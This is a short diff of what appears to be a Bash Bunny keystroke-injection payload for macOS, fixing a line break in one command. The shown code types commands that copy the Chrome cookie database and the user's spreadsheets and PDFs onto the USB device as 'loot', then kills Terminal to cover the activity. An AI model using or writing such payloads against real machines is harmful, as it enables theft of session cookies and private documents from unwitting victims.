@@ -27,8 +27,7 @@ QUACK DELAY 5000
 QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/xlsx
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING cat \~/Library/Application\\ Support/Google/Chrome/Default/Cookies \>
-/Volumes/BashBunny/$lootdir/chromecookies.db
+QUACK STRING cat \~/Library/Application\\ Support/Google/Chrome/Default/Cookies \> /Volumes/BashBunny/$lootdir/chromecookies.db
 QUACK ENTER
 QUACK DELAY 1000
 QUACK STRING cp \~/Documents/{*.xlsx,*.xls,*.pdf} /Volumes/BashBunny/$lootdir/xlsx/\; killall Terminal
